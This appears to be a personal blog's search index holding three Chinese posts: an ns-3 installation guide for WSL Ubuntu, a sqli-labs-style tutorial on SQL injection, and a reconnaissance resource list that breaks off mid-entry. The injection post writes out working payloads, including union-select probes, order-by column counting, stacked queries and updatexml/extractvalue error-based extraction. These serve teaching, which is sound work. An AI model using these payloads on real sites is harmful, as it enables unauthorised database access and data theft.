<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>在ubuntu中安装ns-3 3.43</title>
      <link href="/2025/02/10/%E5%9C%A8ubuntu%E4%B8%AD%E5%AE%89%E8%A3%85ns-3-3-43/"/>
      <url>/2025/02/10/%E5%9C%A8ubuntu%E4%B8%AD%E5%AE%89%E8%A3%85ns-3-3-43/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>我妹妹的老师要求搭建ns-3 不会，所以找到了我，我在网上查了一下发现安装的版本比较老，新的版有些差异，所以我综合网上的资料和官网文档进行安装。与官网的安装步骤有些不同，但亲测是可以跑通的。</p></blockquote><h3 id="软件配置"><a href="#软件配置" class="headerlink" title="软件配置"></a>软件配置</h3><ul><li>wsl（ps：我用的是wsl，如果用虚拟机，需要安装虚拟机软件，比如VMware）</li><li>ubuntu 24.04</li><li>Windows 终端</li></ul><h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><p>因为只用Linux的基础命令不用什么复杂的操作，所以我使用WSL来安装ubuntu,<br>如果有现成的Linux并且已经配置好了，请直接跳转到6.安装ns-3.43</p><h4 id="1-打开虚拟化"><a href="#1-打开虚拟化" class="headerlink" title="1. 打开虚拟化"></a>1. 打开虚拟化</h4><p>在任务栏搜索 <strong>启用或关闭 Windows 功能</strong>（请直接复制，手敲的话注意Windows前后有空格）打开<br><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image.png" alt="alt text"></p><p>对与家庭版用户，下滑到最下面然后选择框选的两个选项，然后重启电脑。</p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-1.png" alt="alt text"></p><p>如果是专业版用户还需要打开Hyper-V，然后重启电脑</p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-2.png" alt="alt text"></p><h4 id="2-安装Windows-终端"><a href="#2-安装Windows-终端" class="headerlink" title="2. 安装Windows 终端"></a>2. 安装Windows 终端</h4><p>自带的cmd太过于简陋，所以安装一个Windows 终端，方便使用</p><p>在微软商店中搜索终端安装</p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-3.png" alt="alt text"><br><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-4.png" alt="alt text"></p><h4 id="3-安装ubuntu"><a href="#3-安装ubuntu" class="headerlink" title="3. 安装ubuntu"></a>3. 安装ubuntu</h4><p>在任务栏搜索终端打开，输入以下命令安装ubuntu</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --install</span><br></pre></td></tr></table></figure><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/PixPin_2025-02-10_11-08-04.png" alt="alt text"></p><h4 id="4-打开ubuntu"><a href="#4-打开ubuntu" class="headerlink" title="4. 打开ubuntu"></a>4. 打开ubuntu</h4><p>重新打开终端，从标签页右侧下拉箭头打开ubuntu，<br><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-5.png" alt="alt text"></p><p>第一次打开会设置用户名和密码，用户名我设置成demo。回车<br>之后会输入两次重复的密码，注意，密码不会显示，所以直接输入就行，输完回车<br>再输一遍，回车就成功进入到了ubuntu系统</p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-6.png" alt="alt text"></p><p>为了方便我创建一个root账户进行操作，<br>创建root账户，首先输入你刚刚设置的密码，之后在输入两次root账户的密码（自己设置，请牢记，可以两个密码相同，本地可以，远程不推荐）<br>如果你不使用root账户，接下来的一些命令需要再前面加上sudo，并输入你的密码，需要的地方我会在注释里标明</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-7.png" alt="alt text"></p><p>使用命令切换到root账户，输入root的密码，如果最前面的名字变成了root就成功了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure><h4 id="5-修改源"><a href="#5-修改源" class="headerlink" title="5. 修改源"></a>5. 修改源</h4><p>查看ubuntu的版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-8.png" alt="alt text"></p><p>因为默认的源是国外的，下载非常慢，所以换成国内的源<br>我的版本是24.04，所以修改以下文件</p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-9.png" alt="alt text"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入目录</span></span><br><span class="line"><span class="built_in">cd</span> /etc/apt/sources.list.d/</span><br><span class="line"><span class="comment"># 备份文件</span></span><br><span class="line"><span class="built_in">cp</span> ubuntu.sources ubuntu.sources.bak</span><br><span class="line"><span class="comment"># 编辑文件（可能需要root，请加上sudo，例如：sudo vim ubuntu.sources）</span></span><br><span class="line">vim ubuntu.sources</span><br></pre></td></tr></table></figure><p>修改文件内容，将里面的内容替换成以下内容，保存退出<br>会使用vim的自己修改，不会的请按照一下的按键一个一个的按，请注意大全部是大写大写大写</p><blockquote><p>按键在这儿 –&gt; V G D</p><p>解释 </p><p>V 进入可视模式或者说选择模式</p><p>G 移动到最后一行 配合V实现选中整个文件</p><p>D 删除 大小写均可，最后的实现效果是删除整个文件的内容</p></blockquote><p>删除之后将下面的配置文件复制粘贴到文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Types: deb</span><br><span class="line">URIs: http://mirrors.tuna.tsinghua.edu.cn/ubuntu/</span><br><span class="line">Suites: noble noble-updates noble-security</span><br><span class="line">Components: main restricted universe multiverse</span><br><span class="line">Signed-By: /usr/share/keyrings/ubuntu-archive-keyring.gpg</span><br></pre></td></tr></table></figure><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-10.png" alt="alt text"></p><p>最后先输入冒号，再输入wq，回车保存退出</p><blockquote><p>:wq</p></blockquote><p>更新软件包源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更新软件包源</span></span><br><span class="line">apt update &amp;&amp; apt upgrade</span><br><span class="line"><span class="comment"># 普通用户使用、root用户请忽略</span></span><br><span class="line">sudo apt update &amp;&amp; sudo apt upgrade</span><br></pre></td></tr></table></figure><p>中间会有一个提示，问你要继续吗，按y键回车继续<br><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-11.png" alt="alt text"></p><p>ubuntu 20.04 换源<a href="https://www.cnblogs.com/zqifa/p/12910989.html">参考文章</a></p><h4 id="6-安装ns-3-43"><a href="#6-安装ns-3-43" class="headerlink" title="6. 安装ns-3.43"></a>6. 安装ns-3.43</h4><p>终于进入到正题了，首先切换目录到&#x2F;opt&#x2F;文件夹下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 切换目录</span></span><br><span class="line"><span class="built_in">cd</span> /opt/</span><br><span class="line"><span class="comment"># 下载文件</span></span><br><span class="line">wget https://www.nsnam.org/release/ns-allinone-3.43.tar.bz2</span><br><span class="line"><span class="comment"># 安装bzip2用来解压文件（需要root）</span></span><br><span class="line">apt install bzip2</span><br><span class="line"><span class="comment"># 解压文件</span></span><br><span class="line">tar xjf ns-allinone-3.43.tar.bz2</span><br><span class="line"><span class="comment"># 进入解压后的文件夹</span></span><br><span class="line"><span class="built_in">cd</span> ns-allinone-3.43</span><br><span class="line"><span class="comment"># 安装所需的组件（这是我看一位印度老哥的博客，有些是必须的，有些可能不是，直接全部安装大约3G左右）（需要root）</span></span><br><span class="line">apt install g++ python3 cmake ninja-build git gir1.2-goocanvas-2.0 python3-gi python3-gi-cairo python3-pygraphviz gir1.2-gtk-3.0 ipython3 tcpdump wireshark sqlite3 libsqlite3-dev qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools openmpi-bin openmpi-common openmpi-doc libopenmpi-dev doxygen graphviz imagemagick python3-sphinx dia imagemagick texlive dvipng latexmk texlive-extra-utils texlive-latex-extra texlive-font-utils libeigen3-dev gsl-bin libgsl-dev libgslcblas0 libxml2 libxml2-dev libgtk-3-dev lxc-utils lxc-templates vtun uml-utilities ebtables bridge-utils libxml2 libxml2-dev libboost-all-dev ccache</span><br><span class="line"><span class="comment"># 构建</span></span><br><span class="line">./build.py --enable-examples --enable-tests</span><br></pre></td></tr></table></figure><p>选择yes后，等待组件安装完毕,之后执行上面的构建命令，就成功安装了ns-3.43<br><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-12.png" alt="alt text"></p><p>完成后测试一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 切换目录</span></span><br><span class="line"><span class="built_in">cd</span> ns-3.43/</span><br><span class="line"><span class="comment"># 运行测试（需要root）</span></span><br><span class="line">./ns3 run examples/tutorial/first.cc</span><br></pre></td></tr></table></figure><p>成功出现了At time 这些数据说明安装成功<br><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-13.png" alt="alt text"></p><h4 id="自己编写的脚本如何运行？"><a href="#自己编写的脚本如何运行？" class="headerlink" title="自己编写的脚本如何运行？"></a>自己编写的脚本如何运行？</h4><p>先说结果，放到scratch文件夹，运行命令，就可以运行了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 运行测试（需要root）</span></span><br><span class="line">./ns3 run scratch/你的文件名.后缀</span><br></pre></td></tr></table></figure><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-16.png" alt="alt text"></p><p>我对他的结构不太了解，从官网的文档看，他将自定义的脚本当到了scratch文件夹下，然后是可以运行的，放到examples&#x2F;tutorial&#x2F;目录下会报错，<br><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-14.png" alt="alt text"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> ns-3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入的分类及概念</title>
      <link href="/2023/04/17/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%86%E7%B1%BB%E5%8F%8A%E6%A6%82%E5%BF%B5/"/>
      <url>/2023/04/17/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%86%E7%B1%BB%E5%8F%8A%E6%A6%82%E5%BF%B5/</url>
      
        <content type="html"><![CDATA[<h1 id="基于从服务器接收到的响应"><a href="#基于从服务器接收到的响应" class="headerlink" title="基于从服务器接收到的响应"></a>基于从服务器接收到的响应</h1><ul><li><p>基于错误的 SQL 注入 </p></li><li><p>联合查询的类型 </p></li><li><p>堆查询注射 </p></li><li><p>SQL 盲注</p><ul><li><p>基于布尔 SQL 盲注Mysql 注入</p></li><li><p>基于时间的 SQL 盲注 </p></li><li><p>基于报错的 SQL 盲注</p></li></ul></li></ul><h1 id="基于如何处理输入的-SQL-查询（数据类型）"><a href="#基于如何处理输入的-SQL-查询（数据类型）" class="headerlink" title="基于如何处理输入的 SQL 查询（数据类型）"></a>基于如何处理输入的 <strong>SQL</strong> <strong>查询（数据类型）</strong></h1><ul><li><p>基于字符串 </p></li><li><p>数字或整数为基础的</p></li></ul><h1 id="基于程度和顺序的注入"><a href="#基于程度和顺序的注入" class="headerlink" title="基于程度和顺序的注入"></a>基于程度和顺序的注入</h1><ul><li><p>一阶注射 </p><blockquote><p>一阶注射是指输入的注射语句对 WEB 直接产生了影响，出现了结果</p></blockquote></li><li><p>二阶注射 </p><blockquote><p>二阶注入类似存 储型 XSS，是指输入提交的语句，无法直接对 WEB 应用程序产生影响，通过其它的辅助间 接的对 WEB 产生危害，这样的就被称为是二阶注入.</p></blockquote></li></ul><h1 id="基于注入点的位置上的"><a href="#基于注入点的位置上的" class="headerlink" title="基于注入点的位置上的"></a>基于注入点的位置上的</h1><ul><li><p>通过用户输入的表单域的注射。 </p></li><li><p>通过 cookie 注射。 </p></li><li><p>通过服务器变量注射。 （基于头部信息的注射）</p></li></ul><h1 id="以上摘抄自《sqlilabsg过关手册注入天书》"><a href="#以上摘抄自《sqlilabsg过关手册注入天书》" class="headerlink" title="以上摘抄自《sqlilabsg过关手册注入天书》"></a>以上摘抄自《sqlilabsg过关手册注入天书》</h1><p>自己大致总结如下</p><ul><li>联合查询</li><li>堆叠查询</li><li>报错注入</li><li>布尔盲注</li><li>时间盲注</li><li>宽字节注入</li><li>二阶注入</li><li>头部注入</li></ul><h1 id="数字型-x2F-字符型注入判断"><a href="#数字型-x2F-字符型注入判断" class="headerlink" title="数字型&#x2F;字符型注入判断"></a>数字型&#x2F;字符型注入判断</h1><table><thead><tr><th align="center">id</th><th align="center">数字型（id&#x3D;id）</th><th align="center">字符型 （id&#x3D;’id’）</th></tr></thead><tbody><tr><td align="center">1’</td><td align="center">id&#x3D;1’ 返回错误</td><td align="center">id&#x3D;’1’’ 返回错误</td></tr><tr><td align="center">1’ –+</td><td align="center">id&#x3D;1’ –+ 返回错误</td><td align="center">id&#x3D;’1’ –+’’ 返回正常</td></tr><tr><td align="center">1 and 1&#x3D;1</td><td align="center">id&#x3D;1 and 1&#x3D;1 返回正常</td><td align="center">id&#x3D;’1 and 1&#x3D;1’ 返回正常</td></tr><tr><td align="center">1 and 1&#x3D;2</td><td align="center">id&#x3D;1 and 1&#x3D;2 返回错误</td><td align="center">id&#x3D;’1 and 1&#x3D;2’ 返回正常</td></tr><tr><td align="center">1 or 1&#x3D;1</td><td align="center">id&#x3D; 1 or 1&#x3D;1 返回正常</td><td align="center">id&#x3D; ‘1 or 1&#x3D;1’ 返回正常</td></tr><tr><td align="center">1 or 1&#x3D;2</td><td align="center">id&#x3D;1 or 1&#x3D;2 返回正常</td><td align="center">id&#x3D;’1 or 1&#x3D;2’ 返回正常</td></tr></tbody></table><h1 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h1><p><strong>前提条件：页面上有显示位</strong></p><blockquote><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。</p><p>请注意，UNION 内部的每个 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name(s) FROM table1</span><br><span class="line">UNION</span><br><span class="line">SELECT column_name(s) FROM table2;</span><br><span class="line"># 默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。</span><br></pre></td></tr></table></figure><p>UNION的作用是将两个select查询结果合并，为了爆出第一位后面的显示位，需要隐藏正常结果，比如将<code>？id=1</code>改为<code>？id=-1</code>，使union前面的语句报错，执行后面的，爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># union 前面的语句不爆错，界面显示正常</span><br><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; union select 1,2,3 -- &#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20230417201543275.png" alt="image-20230417201543275"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使union前面的sql语句报错，后面的查询结果出来了</span><br><span class="line">SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,3 -- &#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20230417201614694.png" alt="image-20230417201614694"></p><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><h3 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a><strong>order by</strong></h3><p>ORDER BY 关键字用于对结果集按照一个列或者多个列进行排序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from 表名 order by 列名(或者数字) asc；升序(默认升序)</span><br><span class="line">select * from 表名 order by 列名(或者数字) desc；降序</span><br></pre></td></tr></table></figure><p>这里的重点在于order by后既可以填列名或者是一个数字。举个例子： id是user表的第一列的列名，那么如果想根据id来排序，有两种写法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from user order by id;</span><br><span class="line">selecr * from user order by 1;</span><br></pre></td></tr></table></figure><p>所以说在判断字段数时用order by，再不超过字段数时页面返回正常，一旦超出就会报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; order by 3 -- &#x27; LIMIT 0,1</span><br><span class="line"># 字段数为3，页面返回正常</span><br></pre></td></tr></table></figure><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20230417202821353.png" alt="image-20230417202821353"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; order by 4 -- &#x27; LIMIT 0,1</span><br><span class="line"># 字段数为4，超出最大字段数，页面报错</span><br></pre></td></tr></table></figure><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20230417203445041.png" alt="image-20230417203445041"></p><h3 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h3><h4 id="concat-函数"><a href="#concat-函数" class="headerlink" title="concat()函数"></a><strong>concat()函数</strong></h4><blockquote><p> CONCAT(str1,str2,…)<br>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。可以有一个或多个参数。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select concat(id,username) from users;</span><br><span class="line"># 返回的结果是拼接在一起的</span><br></pre></td></tr></table></figure><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20230417205946504.png" alt="image-20230417205946504"></p><h4 id="CONCAT-WS-函数"><a href="#CONCAT-WS-函数" class="headerlink" title="CONCAT_WS()函数"></a>CONCAT_WS()函数</h4><blockquote><p>CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。如果分隔符为 NULL，则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。但是CONCAT_WS()不会忽略任何空字符串。 (然而会忽略所有的 NULL）。</p><p>CONCAT_WS(separator,str1,str2,…)</p><p>Separator为字符之间的分隔符</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select concat_ws(&#x27;~&#x27;,id,username) from users;</span><br><span class="line"># 第一个是分隔符，返回的数据更加的直观</span><br></pre></td></tr></table></figure><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20230417210256134.png" alt="image-20230417210256134"></p><h4 id="GROUP-CONCAT（）函数"><a href="#GROUP-CONCAT（）函数" class="headerlink" title="GROUP_CONCAT（）函数"></a><strong>GROUP_CONCAT（）函数</strong></h4><blockquote><p>GROUP_CONCAT函数返回一个字符串结果，该结果由分组中的值连接组合而成。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(id,username) from users;</span><br><span class="line"># 将查询的数据拼接成一行</span><br></pre></td></tr></table></figure><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20230417210944941.png" alt="image-20230417210944941"></p><h1 id="堆叠查询"><a href="#堆叠查询" class="headerlink" title="堆叠查询"></a>堆叠查询</h1><blockquote><p>在SQL语句中，语句的结束都是以<code>；</code>结尾，但是如果我们在<code>；</code>后面再加上一条SQL语句，两条语句会一起执行</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use security;show tables;</span><br><span class="line"># 上面的写了两条sql语句，第一条进入security数据库中，第二条查询当前数据库中所有的table表</span><br><span class="line"># 可以看到他们同时运行了</span><br></pre></td></tr></table></figure><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20230417214501312.png" alt="image-20230417214501312"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use secu;show tables;</span><br><span class="line"># 当第一条数据出错时，后面的语句依旧运行</span><br><span class="line"># 上面我进入了一个不存在的数据库，报错了，但后面吗语句依旧查询了当前的数据库的所有table表（我还在security中）</span><br></pre></td></tr></table></figure><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20230417214851961.png" alt="image-20230417214851961"></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><blockquote><p>报错注入的使用场景一般是在页面无法显示数据库的信息，但是是有报错内容的,报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p><p>报错注入形式上一般是做两个嵌套的查询，里面的那个查询被称为子查询，执行顺序也是从子查询开始的，所以我们可以通过子查询查询我们想要的数据，然后在通过报错函数将我们查询到的数据带出，从而达到爆出想要查询的数据。</p></blockquote><h2 id="相关函数-1"><a href="#相关函数-1" class="headerlink" title="相关函数"></a>相关函数</h2><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml（XML_document，XPath_string，New_value）</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">XML_document</td><td align="center">string格式，为XML文档对象的名称</td></tr><tr><td align="center">XPath_string</td><td align="center">代表路径，Xpath格式的字符串</td></tr><tr><td align="center">New_value</td><td align="center">string格式，替换查找到的符合条件的数据</td></tr></tbody></table><p>当第二个参数格式出现错误，会将第二个参数的内容显示在报错信息中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select version()),0x7e),1);</span><br><span class="line"># 报错注入形式上一般是做两个嵌套的查询，里面的那个查询被称为子查询，执行顺序也是从子查询开始的</span><br><span class="line"># updatexml()中的第二个参数是concat(0x7e,(select version(),0x7e)执行结果是</span><br><span class="line"># updatexml(1,~5.7.42~,1);</span><br><span class="line"># ~5.7.42~ 不符合Xpath格式因此报错，将~5.7.42~打印了出来</span><br></pre></td></tr></table></figure><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20230425142736698.png" alt="image-20230425142736698"></p><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(XML_document，xpath_string)</span><br><span class="line"># 同样当第二个参数格式出现错误，会将第二个参数的内容显示在报错信息中</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">XML_document</td><td align="center">string格式，为XML文档对象的名称</td></tr><tr><td align="center">xpath_string</td><td align="center">代表路径，Xpath格式的字符串</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,(select version()),0x7e));</span><br><span class="line"># 参数一为：1</span><br><span class="line"># 参数二为：concat(0x7e,(select version()),0x7e)，执行后结果为~5.7.42~</span><br><span class="line"># ~5.7.42~ 不符合Xpath格式因此报错，将~5.7.42~打印了出来</span><br></pre></td></tr></table></figure><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20230425143845649.png" alt="image-20230425143845649"></p><h3 id="BITINT溢出"><a href="#BITINT溢出" class="headerlink" title="BITINT溢出"></a>BITINT溢出</h3><blockquote><p>数据类型BIGINT的长度为8字节，也就是说，长度为64比特。这种数据类型最大的有符号值，用二进制、十六进制和十进制的表示形式分别为“0b0111111111111111111111111111111111111111111111111111111111111111”、“0x7fffffffffffffff”和“9223372036854775807”。 当对这个值进行某些数值运算的时候，比如加法运算，就会引起“BIGINT value is out of range”错误。</p></blockquote><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20230425150532765.png" alt="image-20230425150532765"></p><p>可以参考文章 bigint 溢出文章 <a href="http://www.cnblogs.com/lcamry/articles/5509112.html">http://www.cnblogs.com/lcamry/articles/5509112.html</a> </p><p>我没有复现成功可能已经修复了，我虽然报错了但并没有查询到数据</p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><blockquote><p>何为盲注？盲注就是在 sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显 </p><p>到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p></blockquote><h2 id="相关函数-2"><a href="#相关函数-2" class="headerlink" title="相关函数"></a>相关函数</h2><h3 id="Mid"><a href="#Mid" class="headerlink" title="Mid()"></a>Mid()</h3>]]></content>
      
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2023/04/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2023/04/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h2 id="一、域名信息"><a href="#一、域名信息" class="headerlink" title="一、域名信息"></a>一、域名信息</h2><h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><p>whois信息在线收集地址<br>站长之家： <a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a><br>阿里云域名信息查询：<a href="https://whois.aliyun.com/">https://whois.aliyun.com</a><br>爱站：<a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a><br>微步：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p><h3 id="whois反查"><a href="#whois反查" class="headerlink" title="whois反查"></a>whois反查</h3><p>站长之家：<a href="http://whois.chinaz.com/">http://whois.chinaz.com</a><br>whois反查可根据whois获取到的域名所有人、域名注册商、域名注册日期和过期日期等,使用邮箱，电话等进行反查获取更多关联的域名等信息</p><h3 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h3><p>常用备案信息查询网站，获取网站的详细信息<br>ICP备案查询网：<a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a><br>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a><br>爱站网：<a href="https://www.aizhan.com/">https://www.aizhan.com/</a></p><h2 id="二、子域名"><a href="#二、子域名" class="headerlink" title="二、子域名"></a>二、子域名</h2><p><strong>通过证书收集</strong><br><a href="https://censys.io/">https://censys.io/</a><br><a href="https://crt.sh/">https://crt.sh/</a></p><p><strong>Google语法</strong><br>利用搜索引擎查询（site:<a href="http://www.xxx.com)/">www.xxx.com）</a></p><p><strong>工具爆破枚举</strong><br>layer子域名挖掘机、御剑、subDomainsBrute、K8</p><p><strong>在线查询</strong><br><a href="http://sbd.ximcx.cn/">http://sbd.ximcx.cn/</a><br>站长工具:<a href="http://tool.chinaz.com/subdomain/">http://tool.chinaz.com/subdomain/</a></p><h2 id="三、旁站、C段"><a href="#三、旁站、C段" class="headerlink" 